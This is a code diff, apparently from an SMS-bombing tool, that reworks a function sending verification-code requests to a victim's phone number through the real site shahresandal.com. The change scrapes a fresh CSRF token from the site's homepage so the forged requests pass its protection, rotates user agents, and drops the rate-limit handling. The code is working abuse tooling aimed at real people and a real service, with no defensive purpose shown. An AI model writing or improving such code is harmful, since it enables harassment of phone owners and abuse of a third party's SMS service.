@@ -65,26 +65,56 @@ def send_service_safe(service, phone):
 
 def ShahreSandal(phone):
     try:
-        url = "https://shahresandal.com/sendcode"
+        session = requests.Session()
         
-        # فرمت شماره
+        # ابتدا صفحه اصلی را برای دریافت CSRF Token بگیریم
+        home_response = session.get(
+            "https://shahresandal.com/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج CSRF Token از صفحه
+        csrf_token = None
+        csrf_patterns = [
+            r'name="csrf-token" content="([^"]+)"',
+            r'X-CSRF-TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
+        ]
+        
+        for pattern in csrf_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                csrf_token = match.group(1)
+                break
+        
+        if not csrf_token:
+            print(f'{r}[-] ShahreSandal: Could not extract CSRF Token{a}')
+            return False
+        
+        print(f'{g}[+] CSRF Token: {csrf_token}{a}')
+        
+        # حالا درخواست ارسال کد
+        url = "https://shahresandal.com/sendcode"
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        formatted_phone = f"0{formatted_phone}"
         
         headers = {
             "Accept": "application/json",
             "Content-Type": "application/json",
-            "X-CSRF-Token": "clk7kQTBkwUusgSDxOYoxlmoCKDkx0DbrlBEnC0n",  # CSRF Token
+            "X-CSRF-Token": csrf_token,
             "User-Agent": random.choice(user_agents),
             "Origin": "https://shahresandal.com",
             "Referer": "https://shahresandal.com/",
+            "X-Requested-With": "XMLHttpRequest"
         }
         
         payload = {
             "mobile": formatted_phone
         }
         
-        response = requests.post(
+        response = session.post(
             url, 
             json=payload, 
             headers=headers, 
@@ -100,20 +130,15 @@ def ShahreSandal(phone):
                 if data.get("success") or data.get("status") == "success":
                     print(f'{g}(ShahreSandal) Code Sent{a}')
                     return True
-                else:
-                    print(f'{r}[-] ShahreSandal Failed: {data.get("message", "Unknown error")}{a}')
-                    return False
             except:
-                if "success" in response.text.lower() or "sent" in response.text.lower():
+                if "success" in response.text.lower():
                     print(f'{g}(ShahreSandal) Code Sent{a}')
                     return True
-                return False
-        elif response.status_code == 429:
-            print(f'{y}[!] ShahreSandal: Rate Limited (Too Many Requests){a}')
+        elif response.status_code == 419:
+            print(f'{r}[-] ShahreSandal: CSRF Token Expired/Invalid{a}')
             return False
-        else:
-            print(f'{r}[-] ShahreSandal HTTP Error: {response.status_code}{a}')
-            return False
+        
+        return False
             
     except Exception as e:
         print(f'{r}[!] ShahreSandal Exception: {e}{a}')
